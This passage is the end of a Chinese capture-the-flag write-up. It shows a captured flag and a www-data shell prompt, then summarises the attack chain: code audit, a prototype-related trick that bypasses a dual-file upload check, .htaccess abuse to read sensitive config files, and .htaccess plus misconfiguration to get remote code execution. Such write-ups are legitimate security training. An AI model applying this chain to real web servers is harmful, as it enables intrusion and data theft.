rwctf{cd81450983c06bcb4438dfb8de45ec04}www-data@a17ac98d17ba:/$ 
```

## Wrap up 

总体思路与知识点

1. 代码审计 
2. proto 利用 | 发现双文件上传 bypass
3. 利用 htaccess 越界读 获取 一些敏感配置文件
4. 利用 htaccess 和 一些错误配置 RCE
